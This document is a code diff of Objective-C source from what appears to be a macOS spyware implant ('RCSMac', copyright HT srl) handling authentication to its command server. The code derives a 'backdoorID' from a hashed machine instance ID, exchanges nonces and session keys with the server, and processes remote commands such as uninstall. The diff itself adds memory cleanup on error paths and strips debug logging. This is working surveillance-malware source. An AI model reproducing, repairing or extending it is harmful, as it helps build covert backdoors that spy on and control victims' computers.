@@ -2,7 +2,7 @@
  * RCSMac - Authentication Network Operation
  *
  *
- * Created by revenge on 13/01/2011
+ * Created on 13/01/2011
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
@@ -78,15 +78,9 @@
   NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  NSString *serialNumber = getSystemSerialNumber();
-  
-  NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
-   
-  NSString *userName = NSUserName();
-  [_instanceID appendString: userName];
+  NSString *_instanceID = getCurrInstanceID();
   
   NSData *instanceID = [_instanceID sha1Hash];
-  [_instanceID release];
   
   NSMutableData *backdoorID = [[NSMutableData alloc] init];
   
@@ -164,7 +158,6 @@
       [message release];
       [encMessage release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -190,6 +183,8 @@
   
   gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
 
+  [sessionKey release];
+  
   // second part of the server response contains the NOnce and the response
   // extract the NOnce and check if it is ok
   // this MUST be the same NOnce sent to the server, but since it is crypted
@@ -202,7 +197,17 @@
                              NSMakeRange(32, [replyData length] - 32)]];
     }
   @catch (NSException *e)
-    {   
+    {  
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [outerPool release];
       return NO;
     }
   
@@ -212,6 +217,17 @@
                                           length: 16];
   if ([nOnce isEqualToData: rNonce] == NO)
     {    
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [rNonce release];
+      [outerPool release];
       return NO;
     }
   
@@ -227,60 +243,52 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"exception on protoCommand makerange (%@)", [e reason]);
-#endif
-      
+      [kd release];
+      [nOnce release];
+      [backdoorID release];
+      [type release];
+      [idToken release];
+      [message release];
+      [encMessage release];
+      [gSessionKey release];
+      gSessionKey = nil;
+      [rNonce release];
+      [_protoCommand release];
+      [outerPool release];
       return NO;
     }
   
   [kd release];
   [nOnce release];
-  // FIXED-
   [backdoorID release];
   [type release];
-  //
   [idToken release];
   [message release];
   [encMessage release];
   [ks release];
   [ksString release];
-  [sessionKey release];
   [secondPartResponse release];
   [rNonce release];
-  
   [outerPool release];
   
   switch (protoCommand)
     {
     case PROTO_OK:
       {
-#ifdef DEBUG_AUTH_NOP
-        infoLog(@"Auth Response OK");
-#endif
       } break;
     case PROTO_UNINSTALL:
       {
-#ifdef DEBUG_AUTH_NOP
-        infoLog(@"Uninstall");
-#endif
-      
-        RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-        [taskManager uninstallMeh];
       } break;
     case PROTO_NO:
     default:
       {
-#ifdef DEBUG_AUTH_NOP
-        errorLog(@"Received command: %d", protoCommand);
-#endif
-
         [_protoCommand release];
         return NO;
       } break;
     }
 
   [_protoCommand release];
+  
   return YES;
 }
 
